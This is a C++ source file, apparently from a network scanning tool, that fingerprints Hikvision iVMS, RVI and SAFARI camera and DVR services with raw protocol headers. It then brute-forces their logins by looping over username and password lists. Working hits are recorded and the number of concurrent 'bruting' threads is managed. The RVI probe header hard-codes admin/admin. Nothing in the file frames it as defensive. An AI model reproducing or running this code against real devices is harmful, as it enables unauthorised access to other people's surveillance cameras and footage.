#include "HikvisionLogin.h"
#include "externData.h"
#include "FileUpdater.h"

bool HikVis::isInitialized = false;
int HikVis::hikCounter = 0;
int HikVis::hikPart = 0;
int HikVis::rviCounter = 0;
int HikVis::rviPart = 0;

const char headerSAFARI[128] = {
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x60, 0x52, 0x00, 0x00, 0x00, 0x7b, 0x22, 0x4d, 0x4f,
	0x44, 0x55, 0x4c, 0x45, 0x22, 0x3a, 0x22, 0x43, 0x45, 0x52, 0x54, 0x49, 0x46, 0x49, 0x43, 0x41,
	0x54, 0x45, 0x22, 0x2c, 0x22, 0x4f, 0x50, 0x45, 0x52, 0x41, 0x54, 0x49, 0x4f, 0x4e, 0x22, 0x3a,
	0x22, 0x43, 0x4f, 0x4e, 0x4e, 0x45, 0x43, 0x54, 0x22, 0x2c, 0x22, 0x53, 0x45, 0x53, 0x53, 0x49,
	0x4f, 0x4e, 0x22, 0x3a, 0x22, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x35, 0x2d, 0x36, 0x66,
	0x37, 0x32, 0x2d, 0x34, 0x31, 0x63, 0x61, 0x2d, 0x39, 0x63, 0x37, 0x33, 0x2d, 0x62, 0x34, 0x37,
	0x31, 0x33, 0x32, 0x36, 0x33, 0x65, 0x62, 0x36, 0x30, 0x22, 0x7d, 0x00
};

const char headerIVMS[32] = { 
	0x00, 0x00, 0x00, 0x20, 0x63, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 
};

const char headerRVI[32] = {
	0xa0, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00, 0x00,
	0x61, 0x64, 0x6d, 0x69, 0x6e, 0x00, 0x00, 0x00,
	0x61, 0x64, 0x6d, 0x69, 0x6e, 0x00, 0x00, 0x00,
	0x04, 0x01, 0x00, 0x00, 0x00, 0x00, 0xa1, 0xaa
};

const char loginRVIHeaderStart[8] = {
	0xa0, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00, 0x00
};
const char loginRVIHeaderEnd[8] = {
	0x04, 0x01, 0x00, 0x00, 0x00, 0x00, 0xa1, 0xaa
};



int recvWT(
	SOCKET socket,
	char *Buffer,
	int Len,
	long Timeout,
	int *bTimedOut
	){
	fd_set ReadSet;
	int n;
	struct timeval Time;
	FD_ZERO(&ReadSet);
	FD_SET(socket, &ReadSet);
	Time.tv_sec = Timeout;
	Time.tv_usec = 0;
	*bTimedOut = false;
	n = select(socket + 1, &ReadSet, NULL, NULL, &Time);
	if (n > 0) { /* got some data */
		return recv(socket, Buffer, Len, 0);
	}
	if (n == 0) { /* timeout */
		*bTimedOut = true;
	}
	return(n); /* trouble */
}


bool HikVis::checkHikk(const char * sDVRIP, int port) {
	sockaddr_in sa;
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);

	hostent *host = NULL;
#if defined(WIN32)
	if (inet_addr(sDVRIP) != INADDR_NONE) sa.sin_addr.S_un.S_addr = inet_addr(sDVRIP);
	else if (host = gethostbyname(sDVRIP)) ((unsigned long*)&sa.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];
#else
	if (inet_addr(sDVRIP) != INADDR_NONE) sa.sin_addr.s_addr = inet_addr(sDVRIP);
	else if (host = gethostbyname(sDVRIP)) ((unsigned long*)&sa.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];
#endif
	else {
		if (gNegDebugMode)
		{
			stt->doEmitionDebugFoundData("inet_addr error - iVMS check failed [<a href=\"http://" + QString(sDVRIP) + ":" + QString::number(port) +
				"/\"><font color=\"#0084ff\">" + QString(sDVRIP) + ":" + QString::number(port) + "</font></a>]");
		}
		return false;
	}

	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET) {
		if (gNegDebugMode)
		{
			stt->doEmitionDebugFoundData("Socket error - iVMS check failed [<a href=\"http://" + QString(sDVRIP) + ":" + QString::number(port) +
				"/\"><font color=\"#0084ff\">" + QString(sDVRIP) + ":" + QString::number(port) + "</font></a>]");
		}
		return false;
	}

	struct linger linger = { 1, gTimeOut };
	setsockopt(sock, SOL_SOCKET, SO_LINGER, (const char *)&linger, sizeof(linger));

	int res = connect(sock, (sockaddr*)&sa, sizeof(sa));
	int bTO;
	char buff[2048] = { 0 };
	if (res != SOCKET_ERROR) {
		send(sock, headerIVMS, 32, 0);
		char tBuff[32] = { 0 };
		int offset = 0;
		int sz = 0;
		int bsz = 0;
		while ((sz = recvWT(sock, tBuff, 16, gTimeOut, &bTO)) > 0) {
			memcpy(buff + offset, tBuff, sz);
			offset = sz;
			bsz += sz;
		}

		shutdown(sock, SD_BOTH);
		closesocket(sock);

		if (bsz == 0) {
			if (gNegDebugMode)
			{
				stt->doEmitionDebugFoundData("iVMS check failed - size = 0, code = (" + QString::number(sz) + ") [<a href=\"http://" + QString(sDVRIP) + ":" + QString::number(port) +
					"/\"><font color=\"#0084ff\">" + QString(sDVRIP) + ":" + QString::number(port) + "</font></a>]");
			}
			return false;
		}
		else {
			if (buff[3] == 0x10) {
				if (gNegDebugMode)
				{
					stt->doEmitionDebugFoundData("iVMS check succeeded [<a href=\"http://" + QString(sDVRIP) + ":" + QString::number(port) +
						"/\"><font color=\"#0084ff\">" + QString(sDVRIP) + ":" + QString::number(port) + "</font></a>]");
				}
				return true;
			}
			else {
				if (gNegDebugMode)
				{
					stt->doEmitionDebugFoundData("iVMS check failed [<a href=\"http://" + QString(sDVRIP) + ":" + QString::number(port) +
						"/\"><font color=\"#0084ff\">" + QString(sDVRIP) + ":" + QString::number(port) + "</font></a>]");
				}
				return false;
			}
		}
	}
	
	shutdown(sock, SD_BOTH);
	closesocket(sock);
	if (gNegDebugMode)
	{
		stt->doEmitionDebugFoundData("Unknown error - iVMS check failed [<a href=\"http://" + QString(sDVRIP) + ":" + QString::number(port) +
			"/\"><font color=\"#0084ff\">" + QString(sDVRIP) + ":" + QString::number(port) + "</font></a>]");
	}
	return false;
}

bool HikVis::checkRVI(const char * sDVRIP, int port) {
	sockaddr_in sa;
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);

	hostent *host = NULL;
#if defined(WIN32)
	if (inet_addr(sDVRIP) != INADDR_NONE) sa.sin_addr.S_un.S_addr = inet_addr(sDVRIP);
	else if (host = gethostbyname(sDVRIP)) ((unsigned long*)&sa.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];
#else
	if (inet_addr(sDVRIP) != INADDR_NONE) sa.sin_addr.s_addr = inet_addr(sDVRIP);
	else if (host = gethostbyname(sDVRIP)) ((unsigned long*)&sa.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];
#endif
	else {
		if (gNegDebugMode)
		{
			stt->doEmitionDebugFoundData("inet_addr error - RVI check failed [<a href=\"http://" + QString(sDVRIP) + ":" + QString::number(port) +
				"/\"><font color=\"#0084ff\">" + QString(sDVRIP) + ":" + QString::number(port) + "</font></a>]");
		}
		return false;
	}

	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET) {
		if (gNegDebugMode)
		{
			stt->doEmitionDebugFoundData("Socket error - RVI check failed [<a href=\"http://" + QString(sDVRIP) + ":" + QString::number(port) +
				"/\"><font color=\"#0084ff\">" + QString(sDVRIP) + ":" + QString::number(port) + "</font></a>]");
		}
		return false;
	}

	struct linger linger = { 1, gTimeOut };
	setsockopt(sock, SOL_SOCKET, SO_LINGER, (const char *)&linger, sizeof(linger));

	int res = connect(sock, (sockaddr*)&sa, sizeof(sa));
	int bTO;
	char buff[2048] = { 0 };
	if (res != SOCKET_ERROR) {
		send(sock, headerRVI, 32, 0);
		char tBuff[32] = { 0 };
		int offset = 0;
		int sz = 0;
		int bsz = 0;
		while ((sz = recvWT(sock, tBuff, 16, gTimeOut, &bTO)) > 0) {
			memcpy(buff + offset, tBuff, sz);
			offset = sz;
			bsz += sz;
		}

		shutdown(sock, SD_BOTH);
		closesocket(sock);
		if (bsz == 0) {
			if (gNegDebugMode)
			{
				stt->doEmitionDebugFoundData("RVI check failed - size = 0, code = (" + QString::number(sz) + ") [<a href=\"http://" + QString(sDVRIP) + ":" + QString::number(port) +
					"/\"><font color=\"#0084ff\">" + QString(sDVRIP) + ":" + QString::number(port) + "</font></a>]");
			}
			return false;
		}
		else {
			if (buff[0] == -80) {
				if (gNegDebugMode)
				{
					stt->doEmitionDebugFoundData("RVI check succeeded [<a href=\"http://" + QString(sDVRIP) + ":" + QString::number(port) +
						"/\"><font color=\"#0084ff\">" + QString(sDVRIP) + ":" + QString::number(port) + "</font></a>]");
				}
				return true;
			}
			else {
				if (gNegDebugMode)
				{
					stt->doEmitionDebugFoundData("RVI check failed [<a href=\"http://" + QString(sDVRIP) + ":" + QString::number(port) +
						"/\"><font color=\"#0084ff\">" + QString(sDVRIP) + ":" + QString::number(port) + "</font></a>]");
					stt->doEmitionDebugFoundData("Buffer: " + QString(buff).toLocal8Bit().toHex());
				}
				return false;
			}
		}
	}

	shutdown(sock, SD_BOTH);
	closesocket(sock);
	if (gNegDebugMode)
	{
		stt->doEmitionDebugFoundData("Unknown error - RVI check failed [<a href=\"http://" + QString(sDVRIP) + ":" + QString::number(port) +
			"/\"><font color=\"#0084ff\">" + QString(sDVRIP) + ":" + QString::number(port) + "</font></a>]");
	}
	return false;
}

bool HikVis::checkSAFARI(const char * sDVRIP, int port) {
	sockaddr_in sa;
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);

	hostent *host = NULL;
#if defined(WIN32)
	if (inet_addr(sDVRIP) != INADDR_NONE) sa.sin_addr.S_un.S_addr = inet_addr(sDVRIP);
	else if (host = gethostbyname(sDVRIP)) ((unsigned long*)&sa.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];
#else
	if (inet_addr(sDVRIP) != INADDR_NONE) sa.sin_addr.s_addr = inet_addr(sDVRIP);
	else if (host = gethostbyname(sDVRIP)) ((unsigned long*)&sa.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];
#endif
	else {
		if (gNegDebugMode)
		{
			stt->doEmitionDebugFoundData("inet_addr error - SAFARI check failed [<a href=\"http://" + QString(sDVRIP) + ":" + QString::number(port) +
				"/\"><font color=\"#0084ff\">" + QString(sDVRIP) + ":" + QString::number(port) + "</font></a>]");
		}
		return false;
	}

	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET) {
		if (gNegDebugMode)
		{
			stt->doEmitionDebugFoundData("Socket error - SAFARI check failed [<a href=\"http://" + QString(sDVRIP) + ":" + QString::number(port) +
				"/\"><font color=\"#0084ff\">" + QString(sDVRIP) + ":" + QString::number(port) + "</font></a>]");
		}
		return false;
	}

	struct linger linger = { 1, gTimeOut };
	setsockopt(sock, SOL_SOCKET, SO_LINGER, (const char *)&linger, sizeof(linger));

	int res = connect(sock, (sockaddr*)&sa, sizeof(sa));
	int bTO;
	char buff[2048] = { 0 };
	if (res != SOCKET_ERROR) {
		send(sock, headerSAFARI, 128, 0);
		char tBuff[128] = { 0 };
		int offset = 0;
		int sz = 0;
		int bsz = 0;
		while ((sz = recvWT(sock, tBuff, 128, gTimeOut, &bTO)) > 0) {
			memcpy(buff + offset, tBuff, sz);
			offset = sz;
			bsz += sz;
		}

		shutdown(sock, SD_BOTH);
		closesocket(sock);

		if (bsz == 0) {
			if (gNegDebugMode)
			{
				stt->doEmitionDebugFoundData("SAFARI check failed - size = 0, code = (" + QString::number(sz) + ") [<a href=\"http://" + QString(sDVRIP) + ":" + QString::number(port) +
					"/\"><font color=\"#0084ff\">" + QString(sDVRIP) + ":" + QString::number(port) + "</font></a>]");
			}
			return false;
		}
		else {
			if (buff[0] != '\0') {
				if (gNegDebugMode)
				{
					stt->doEmitionDebugFoundData("SAFARI check succeeded [<a href=\"http://" + QString(sDVRIP) + ":" + QString::number(port) +
						"/\"><font color=\"#0084ff\">" + QString(sDVRIP) + ":" + QString::number(port) + "</font></a>]");
				}
				return true;
			}

			if (buff[0] == 8) {
				if (gNegDebugMode)
				{
					stt->doEmitionDebugFoundData("SAFARI check succeeded [<a href=\"http://" + QString(sDVRIP) + ":" + QString::number(port) +
						"/\"><font color=\"#0084ff\">" + QString(sDVRIP) + ":" + QString::number(port) + "</font></a>]");
				}
				return true;
			}
			else {
				if (gNegDebugMode)
				{
					stt->doEmitionDebugFoundData("SAFARI check failed [<a href=\"http://" + QString(sDVRIP) + ":" + QString::number(port) +
						"/\"><font color=\"#0084ff\">" + QString(sDVRIP) + ":" + QString::number(port) + "</font></a>]");
				}
				return false;
			}
		}
	}

	shutdown(sock, SD_BOTH);
	closesocket(sock);
	if (gNegDebugMode)
	{
		stt->doEmitionDebugFoundData("Unknown error - SAFARI check failed [<a href=\"http://" + QString(sDVRIP) + ":" + QString::number(port) +
			"/\"><font color=\"#0084ff\">" + QString(sDVRIP) + ":" + QString::number(port) + "</font></a>]");
	}
	return false;
}

#include "Utils.h"
lopaStr HikVis::hikLogin(const char * sDVRIP, int wDVRPort) 
{
	lopaStr lps = { "UNKNOWN", "", "" };
	int passCounter = 0;
	char ip[64] = { 0 };
	strcpy(ip, sDVRIP);
	int rowIndex = -1;

	char login[32] = { 0 };
	char pass[32] = { 0 };

	for (int i = 0; i < MaxLogin; ++i) {
		FileUpdater::cv.wait(FileUpdater::lk, [] {return FileUpdater::ready; });
		strcpy(login, loginLst[i]);
		for (int j = 0; j < MaxPass; ++j) {
			FileUpdater::cv.wait(FileUpdater::lk, []{return FileUpdater::ready; });
			if (!globalScanFlag) return lps;
			strcpy(pass, passLst[j]);

			NET_DVR_DEVICEINFO_V30 *info = 0;
			hik_init_ptr();
			int res = hik_login_ptr(ip, wDVRPort, login, pass, info);
			hik_cleanup_ptr();
			if (res == 0) {
				strcpy(lps.login, login);
				strcpy(lps.pass, pass);

				rowIndex = Utils::addBARow(QString(ip) + ":" + QString::number(wDVRPort), QString(login) + ":" + QString(pass), "OK", rowIndex);
				
				return lps;
			}

			rowIndex = Utils::addBARow(QString(ip) + ":" + QString::number(wDVRPort), QString(login) + ":" + QString(pass), QString::number((passCounter / (double)(MaxPass*MaxLogin)) * 100).mid(0, 4) + "%", rowIndex);

			++passCounter;
			Sleep(200);
		}
	}

	rowIndex = Utils::addBARow(QString(ip) + ":" + QString::number(wDVRPort), "--", "FAIL", rowIndex);

	return lps;
}

int rvi_login_ptr(const char *sDVRIP, int wDVRPort, const char *login, const char *pass) {
	sockaddr_in sa;
	sa.sin_family = AF_INET;
	sa.sin_port = htons(wDVRPort);

	hostent *host = NULL;
#if defined(WIN32)
	if (inet_addr(sDVRIP) != INADDR_NONE) sa.sin_addr.S_un.S_addr = inet_addr(sDVRIP);
	else if (host = gethostbyname(sDVRIP)) ((unsigned long*)&sa.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];
#else
	if (inet_addr(sDVRIP) != INADDR_NONE) sa.sin_addr.s_addr = inet_addr(sDVRIP);
	else if (host = gethostbyname(sDVRIP)) ((unsigned long*)&sa.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];
#endif
	else return -1;

	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET) return -1;

	struct linger linger = { 1, gTimeOut };
	setsockopt(sock, SOL_SOCKET, SO_LINGER, (const char *)&linger, sizeof(linger));

	int res = connect(sock, (sockaddr*)&sa, sizeof(sa));
	int bTO;

	char newlp[32] = {0};
	memcpy(newlp, loginRVIHeaderStart, 8);
	memcpy(newlp + 8, login, strlen(login));
	memcpy(newlp + 16, pass, strlen(pass));
	memcpy(newlp + 24, loginRVIHeaderEnd, 8);

	if (res != SOCKET_ERROR) {
		send(sock, newlp, 32, 0);
		Activity += strlen(newlp);
		stt->doEmitionAddOutData(QString(newlp));
		char buff[32] = { 0 };
		recvWT(sock, buff, 16, gTimeOut, &bTO);
		Activity += strlen(buff);
		stt->doEmitionAddIncData(QString(sDVRIP) + ":" + QString::number(wDVRPort), QString(buff));

		shutdown(sock, SD_BOTH);
		closesocket(sock);

		if (buff[9] == 0x08) return 0;
		else return -1;
	}

	shutdown(sock, SD_BOTH);
	closesocket(sock);
	return -1;
}

#include "Utils.h"
lopaStr HikVis::rviLogin(const char * sDVRIP, int wDVRPort)
{
	lopaStr lps = { "UNKNOWN", "", "" };
	int passCounter = 0;
	char ip[64] = { 0 };
	strcpy(ip, sDVRIP);
	int rowIndex = -1;

	char login[32] = { 0 };
	char pass[32] = { 0 };

	for (int i = 0; i < MaxLogin; ++i) {
		FileUpdater::cv.wait(FileUpdater::lk, [] {return FileUpdater::ready; });
		strcpy(login, loginLst[i]);
		for (int j = 0; j < MaxPass; ++j) {
			FileUpdater::cv.wait(FileUpdater::lk, []{return FileUpdater::ready; });
			if (!globalScanFlag) return lps;
			strcpy(pass, passLst[j]);

			if (strlen(login) > 8) break;
			if (strlen(pass) > 8) continue;

			if (rvi_login_ptr(ip, wDVRPort, login, pass) == 0) {
				strcpy(lps.login, login);
				strcpy(lps.pass, pass);

				rowIndex = Utils::addBARow(QString(ip) + ":" + QString::number(wDVRPort), QString(login) + ":" + QString(pass), "OK", rowIndex);

				return lps;
			}

			rowIndex = Utils::addBARow(QString(ip) + ":" + QString::number(wDVRPort), QString(login) + ":" + QString(pass), QString::number((passCounter / (double)(MaxPass*MaxLogin)) * 100).mid(0, 4) + "%", rowIndex);

			++passCounter;
			Sleep(200);
		}
	}

	rowIndex = Utils::addBARow(QString(ip) + ":" + QString::number(wDVRPort), "--", "FAIL", rowIndex);

	return lps;
}


lopaStr HikVis::HVLobby(const char *ip, const int port) {
	if (gMaxBrutingThreads > 0) {

		while (BrutingThrds >= gMaxBrutingThreads) Sleep(1000);

		++baCount;
		++BrutingThrds;
		stt->doEmitionUpdateArc(gTargets);
		const lopaStr &lps = hikLogin(ip, port);
		--BrutingThrds;

		return lps;
	}
	else {
		lopaStr lps = { "UNKNOWN", "", "" };
		return lps;
	}
}

lopaStr HikVis::RVILobby(const char *ip, const int port) {
	if (gMaxBrutingThreads > 0) {

		while (BrutingThrds >= gMaxBrutingThreads) Sleep(1000);

		++baCount;
		++BrutingThrds;
		stt->doEmitionUpdateArc(gTargets);
		const lopaStr &lps = rviLogin(ip, port);
		--BrutingThrds;

		return lps;
	}
	else {
		lopaStr lps = { "UNKNOWN", "", "" };
		return lps;
	}
}